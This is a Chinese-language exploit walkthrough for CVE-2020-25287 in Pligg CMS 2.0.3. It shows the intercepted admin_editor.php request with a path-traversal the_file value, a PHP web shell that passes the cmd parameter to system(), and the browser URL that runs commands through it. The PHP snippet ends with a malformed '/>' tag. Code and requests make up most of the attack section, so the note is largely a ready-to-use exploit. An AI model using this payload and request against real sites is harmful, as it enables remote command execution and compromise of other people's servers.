# CVE-2020-25287：Pligg 2.0.3允许远程身份验证的用户执行任意命令

## Pligg

Pligg

{% embed url="https://www.pligg.com/" %}



软件类别： CMS 开发语言： PHP 运行平台： PHP+MySQL 授权协议： 开源软件

## POC

{% embed url="https://github.com/jenaye/pligg" %}



说明 ： 我们可以通过模板编辑器菜单使用参数访问任何文件，因为cms没有对扩展进行检查，然后将 Webshell 创建到现有的 php 文件中作为示例 the\_file 受影响的版本 ： 2.0.3

### 利用

![image-20200916160348852](../../.gitbook/assets/image-20200916160348852.png)

转到bp截获请求，并更改文件路径。/admin/admin\_editor.php

范例：xxx.php \(此例子为index.php\)

![image-20200916160604770](../../.gitbook/assets/image-20200916160604770.png)

```bash
POST /admin/admin_editor.php HTTP/1.1
Host: kliqqi
Content-Length: 33
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://kliqqi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://kliqqi/admin/admin_editor.php
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: panelState=CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID=lfkc3gtrv5o1golmt5md3; mnm_user=Admin; mnm_key=QWRtaW46MjI0R2dEVTAxZncxZzpl
Connection: close

the_file=..%2Fxxx.php&open=Open
```

然后发包，这时浏览器会响应并显示以下，修改xxx.php的内容为cmd shell

```php
<?php
  if($_GET['cmd']){
    system($_GET['cmd']);
}
/>
```

![image-20200916161313819](../../.gitbook/assets/image-20200916161313819.png)

最后在浏览器浏览webshell

`xxx.com/xxx.php?cmd=dir`

![image-20200916161421298](../../.gitbook/assets/image-20200916161421298.png)

